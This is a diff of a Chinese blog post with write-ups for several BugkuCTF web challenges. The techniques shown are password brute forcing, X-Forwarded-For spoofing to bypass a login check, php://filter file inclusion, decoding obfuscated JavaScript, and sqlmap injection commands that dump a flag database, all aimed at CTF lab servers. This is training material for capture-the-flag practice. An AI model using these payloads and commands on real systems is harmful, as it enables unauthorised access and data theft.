@@ -6,21 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: NCTF | try2be</title>
+  <title>BUGKUCTF | try2be</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="个人安全技术学习博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="try2be">
-<meta property="og:url" content="http://yoursite.com/tags/NCTF/index.html">
+  <meta name="description" content="记事本装了很多,一次性传上来bugkuctf-网站被黑用御剑扫描http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshell&#x2F;得到两个网址http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshell&#x2F;index.phphttp:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshell&#x2F;shell.php 进入http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUGKUCTF">
+<meta property="og:url" content="http://yoursite.com/2020/02/04/BUGKUCTF/index.html">
 <meta property="og:site_name" content="try2be">
-<meta property="og:description" content="个人安全技术学习博客">
+<meta property="og:description" content="记事本装了很多,一次性传上来bugkuctf-网站被黑用御剑扫描http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshell&#x2F;得到两个网址http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshell&#x2F;index.phphttp:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshell&#x2F;shell.php 进入http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;webshe">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-02-04T12:15:26.000Z">
+<meta property="article:modified_time" content="2020-02-04T12:48:50.586Z">
 <meta property="article:author" content="lu2hx0">
-<meta property="article:tag" content="web安全">
-<meta property="article:tag" content="渗透学习">
-<meta property="article:tag" content="安全技术">
-<meta property="article:tag" content="SQL注入">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="bugkuctf">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="try2be" type="application/atom+xml">
@@ -155,60 +153,256 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-BUGKUCTF" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/09/SQL1/" class="archive-article-date">
-  	<time datetime="2020-01-09T12:20:26.795Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-09</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/09/SQL1/">sql1</a>
+    <h1 class="article-title" itemprop="name">
+      BUGKUCTF
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/02/04/BUGKUCTF/" class="archive-article-date">
+  	<time datetime="2020-02-04T12:15:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="记事本装了很多-一次性传上来"><a href="#记事本装了很多-一次性传上来" class="headerlink" title="记事本装了很多,一次性传上来"></a>记事本装了很多,一次性传上来</h4><h5 id="bugkuctf-网站被黑"><a href="#bugkuctf-网站被黑" class="headerlink" title="bugkuctf-网站被黑"></a>bugkuctf-网站被黑</h5><p>用御剑扫描<a href="http://123.206.87.240:8002/webshell/" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/</a><br>得到两个网址<br><a href="http://123.206.87.240:8002/webshell/index.php" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/index.php</a><br><a href="http://123.206.87.240:8002/webshell/shell.php" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/shell.php</a></p>
+<p>进入<a href="http://123.206.87.240:8002/webshell/shell.php" target="_blank" rel="noopener">http://123.206.87.240:8002/webshell/shell.php</a><br>需要PASS<br>先试一下有没有注入，sqlmap，发现没有<br>用burpsuite爆破  pass为hack<br>得到flag:flag{hack_bug_ku035}</p>
+<a id="more"></a>
+
+<h5 id="web-管理员系统"><a href="#web-管理员系统" class="headerlink" title="web-管理员系统"></a>web-管理员系统</h5><p>表单输入<br>查看源码发现注释里<br>有一段base64:dGVzdDEyMw==<br>解码得到:test123<br>usename和password<br>试一下username和password随便填<br>返回的信息是<br>IP禁止访问，请联系本地管理员登陆，IP已被记录.</p>
+<p>关键是本地登录<br>当username为admin ，password为test123时<br>burp抓包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 123.206.31.85:1003</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 23</span><br><span class="line">Origin: http:&#x2F;&#x2F;123.206.31.85:1003</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;123.206.31.85:1003&#x2F;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user&#x3D;admin&amp;pass&#x3D;test123</span><br></pre></td></tr></table></figure>
+<p>在headers里加入X-Forwarded-For: 127.0.0.1<br>send<br>查看Response<br>The flag is: 85ff2ee4171396724bae20c0bd851f6b<br>根据tip:flag：flag{85ff2ee4171396724bae20c0bd851f6b}</p>
+<h5 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h5><p>&lt; html&gt;<br>&lt; title&gt; BKCTF-WEB4&lt; /title&gt;<br>&lt; body&gt;<br>&lt; div style =”display:none;” &gt; &lt; /div&gt;<br>&lt; form action=”index.php” method=”post” &gt;<br>看看源代码？&lt; br&gt;<br>&lt; br&gt;<br>&lt; script&gt;<br>var p1 = ‘%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62’;<br>var p2 = ‘%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b’;<br>eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));<br>&lt; /script&gt;</p>
+<p>&lt; input type=”input” name=”flag” id=”flag” /&gt;<br>&lt; input type=”submit” name=”submit” value=”Submit” /&gt;<br>&lt; /form&gt;<br>&lt; /body&gt;<br>&lt; /html&gt;</p>
+<p>要用到Escape加密/UnEscape解密<br>工具:<a href="https://escape.supfree.net/" target="_blank" rel="noopener">https://escape.supfree.net/</a></p>
+<p>p1:function checkSubmit(){var a=document.getElementById(“password”);if(“undefined”!=typeof a){if(“67d709b2b<br>p2:aa648cf6e87a7114f1”==a.value)return!0;alert(“Error”);a.focus();return!1}}document.getElementById(“levelQuest”).onsubmit=checkSubmit;<br>%35%34%61%61%32:54aa2</p>
+<p>function checkSubmit(){<br>var a=document.getElementById(“password”);<br>if(“undefined”!=typeof a)<br>{<br>if(“67d709b2b54aa2aa648cf6e87a7114f1”==a.value)<br>   return!0;<br>   alert(“Error”);<br>a.focus();<br>return!1<br>}<br>}<br>document.getElementById(“levelQuest”).onsubmit=checkSubmit;</p>
+<p>输入67d709b2b54aa2aa648cf6e87a7114f1得到key</p>
+<h5 id="bugkuctf-web-index"><a href="#bugkuctf-web-index" class="headerlink" title="bugkuctf web index"></a>bugkuctf web index</h5><p>从url中鼬file= 看出与文件包含有关<br><a href="http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a></p>
+<p>得到<br>PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==<br>base64解码(<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/Tools/Base64.aspx</a>):</p>
+<html>
+    <title>Bugku-ctf</title>
+
+<?php
+    error_reporting(0);
+    if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
+    $file=$_GET['file'];
+    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+        echo "Oh no!";
+        exit();
+    }
+    include($file);
+//flag:flag{edulcni_elif_lacol_si_siht}
+?>
+</html>
+
+
+
+
+
+<h5 id="请输入密码查看flag"><a href="#请输入密码查看flag" class="headerlink" title="请输入密码查看flag"></a>请输入密码查看flag</h5><p>5位数密码</p>
+<p>直接burpsuite的intruder<br>13579异常<br>flag{bugku-baopo-hah}</p>
+<h5 id="bugkuctf-成绩单"><a href="#bugkuctf-成绩单" class="headerlink" title="bugkuctf 成绩单"></a>bugkuctf 成绩单</h5><p>联系post传参<br>试着输入1，<br>burpsuite抓包得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;chengjidan&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 123.206.87.240:8002</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Origin: http:&#x2F;&#x2F;123.206.87.240:8002</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id&#x3D;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r C:\Users\86150\Desktop\1.txt</span><br></pre></td></tr></table></figure>
+<p>POST parameter ‘id’ is vulnerable. Do you want to keep testing the others (if any)? [y/N]</p>
+<p>sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:</p>
+<p>Parameter: id (POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: id=1’ AND (SELECT 9488 FROM (SELECT(SLEEP(5)))QMAH) AND ‘qKFR’=’qKFR</p>
+<pre><code>Type: UNION query
+Title: Generic UNION query (NULL) - 4 columns
+Payload: id=-2587&apos; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626b6b71,0x6f426641776e71797850466a6d694274426e77744278526f486a75445a7845745672546344777147,0x7176626a71)-- ZOOE</code></pre><p>[21:37:31] [INFO] the back-end DBMS is MySQL<br>web application technology: Nginx<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[21:37:31] [INFO] fetched data logged to text files under ‘C:\Users\86150\AppData\Local\sqlmap\output\123.206.87.240’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查库sqlmap.py -r C:\Users\86150\Desktop\1.txt --dbs</span><br></pre></td></tr></table></figure>
+<p>得到<br>available databases [2]:<br>[<em>] information_schema<br>[</em>] skctf_flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查表sqlmap.py -r C:\Users\86150\Desktop\1.txt -D skctf_flag --tables</span><br></pre></td></tr></table></figure>
+<p>得到<br>Database: skctf_flag<br>[2 tables]<br>+——+<br>| fl4g |<br>| sc   |<br>+——+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查行sqlmap.py -r C:\Users\86150\Desktop\1.txt -D  skctf_flag  --columns</span><br></pre></td></tr></table></figure>
+<p>得到<br>Database: skctf_flag<br>Table: sc<br>[5 columns]<br>+———+——————+<br>| Column  | Type             |<br>+———+——————+<br>| chinese | int(3) unsigned  |<br>| english | int(3) unsigned  |<br>| id      | int(10) unsigned |<br>| math    | int(3) unsigned  |<br>| name    | varchar(64)      |<br>+———+——————+</p>
+<p>Database: skctf_flag<br>Table: fl4g<br>[1 column]<br>+————+————-+<br>| Column     | Type        |<br>+————+————-+<br>| skctf_flag | varchar(64) |<br>+————+————-+</p>
+<p>很明显<br>在fl4g中是flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r C:\Users\86150\Desktop\1.txt -D  skctf_flag  -T  fl4g -C  skctf_flag --dump</span><br></pre></td></tr></table></figure>
+<p>得到<br>BUGKU{Sql_INJECT0N_4813drd8hz4}</p>
+<h5 id="web-秋名山老司机"><a href="#web-秋名山老司机" class="headerlink" title="web-秋名山老司机"></a>web-秋名山老司机</h5><p>要求两秒内算一串算式，，<br>亲请在2s内计算老司机的车速是多少<br>2013835303<em>1378474749</em>1778106448<em>1718192413</em>517710853+1857212481+1742707988-1108888479<em>1180331933</em>44072248<em>1215575994=?;<br>刷新页面，，<br>Give me value post about 1097874850</em>1382683007<em>1482748656+264784448+456628203+640356345-97741426+1092031148</em>2091822227-859515844-1211394840=?<br>burpsuite抓包</p>
+<p>GET /qiumingshan/ HTTP/1.1<br>Host: 123.206.87.240:8002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=nodsaeu3qakkqdd7dv7hqcl7o8qndvbn<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p>
+<p>没有发现与2s有关的内容</p>
+<p>wp说要用python写脚本，这题放一放</p>
+<h5 id="web-速度要快"><a href="#web-速度要快" class="headerlink" title="web -速度要快"></a>web -速度要快</h5><p>此题有需要python脚本<br>稍前的步骤为利用burpsuite repeater里的flagbase64解码却发现 flag的值是变化的</p>
+<p>后面接着的很多题好像都是需要脚本。所以web的题写脚本的都先跳过吧。</p>
+<h5 id="web-字符正则"><a href="#web-字符正则" class="headerlink" title="web-字符正则"></a>web-字符正则</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;KEY&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>需要传上符合正则匹配的字符串就会返回key</p>
+<p>分析正则匹配:/key.<em>key.{4,7}key:/./(.*key)[a-z][[:punct:]]/i<br>key.</em> : key后面加长度为0-N的任意字符—key<br>key.{4,7}key : key后面加长度为4-7的任意字符加key—keyzxzxkey<br>:/./ : “/“为“/”转义，即  :/加任意一个字符加/—:/x/<br>(.<em>key) :  根据()在正则匹配中的用法—key<br>[a-z] : 一位小写数字—x<br>[[:punct:]] : 匹配其中一个字符： !”#$%&amp;’()</em>+,-./:;&lt;=&gt;?@[]^_`{|}~.    ,   [:punct:] 子字符类不能包括当前归类中可用的非 ASCII 标点字符—!</p>
+<p>-字符串连接起来: keykeyzxzxkey:/x/keyx!</p>
+<p>PHP trim() 函数<br>定义和用法：<br>trim() 函数移除字符串两侧的空白字符或其他预定义字符。<br>语法：<br>trim(string,charlist) </p>
+<p>url传参，成功，得到KEY{0x0SIOPh550afc}</p>
+<p>trim函数-:<a href="https://www.runoob.com/php/func-string-trim.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-string-trim.html</a><br>正则匹配相关<br><a href="https://www.cnblogs.com/qq1694188561/p/11392579.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq1694188561/p/11392579.html</a><br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">NCTF</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">bugkuctf</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/04/BUGKUCTF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/02/04/bugkuctf-web-never-give-up/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          bugkuctf-web-never give up
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/01/24/BUGKUCTF-SQL%E6%B3%A8%E5%85%A52/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BUGKUCTF-SQL注入2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://yoursite.com/2020/02/04/BUGKUCTF/", 
+    sourceId: "BUGKUCTF",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -231,9 +425,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
